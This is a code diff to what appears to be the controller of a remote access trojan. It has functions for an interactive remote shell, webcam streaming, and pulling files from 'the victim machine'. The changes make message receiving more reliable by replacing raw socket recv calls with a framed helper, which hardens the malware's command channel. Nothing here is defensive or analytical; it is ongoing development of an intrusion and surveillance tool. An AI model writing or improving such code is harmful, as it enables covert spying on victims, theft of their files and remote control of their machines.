@@ -380,8 +380,7 @@ def _shell_session(conn: socket.socket, session_id: int) -> None:
                 continue
 
             conn.sendall(encode_message({"type": "shell_input", "input": cmd}))
-            data = conn.recv(65536)
-            response = decode_message(data.decode("utf-8").strip())
+            response = recv_message(conn)
             print(response.get("output", ""), end="")
 
         except KeyboardInterrupt:
@@ -408,11 +407,7 @@ def _webcam_stream_session(conn: socket.socket, session_id: int) -> None:
 
     try:
         while True:
-            data = conn.recv(10 * 1024 * 1024)  # 10 MB max per frame
-            if not data:
-                break
-
-            response = decode_message(data.decode("utf-8").strip())
+            response = recv_message(conn)
 
             if response.get("type") == "stream_error":
                 print(f"[!] Stream error: {response.get('error')}")
@@ -453,8 +448,7 @@ def _download_file(conn: socket.socket, remote_path: str) -> None:
         remote_path: Path of the file on the victim machine.
     """
     conn.sendall(encode_message({"type": "command", "command": "download", "path": remote_path}))
-    data = conn.recv(10 * 1024 * 1024)  # 10 MB max
-    response = decode_message(data.decode("utf-8").strip())
+    response = recv_message(conn)
 
     if response.get("error"):
         print(f"[!] {response['error']}")
@@ -495,8 +489,7 @@ def _upload_file(conn: socket.socket, local_path: str, session_id: int) -> None:
         )
     )
 
-    data = conn.recv(4096)
-    response = decode_message(data.decode("utf-8").strip())
+    response = recv_message(conn)
     print(response.get("output", "[?] Unexpected response"))
     logger.info("File uploaded to session %s: %s", session_id, local_path)
 
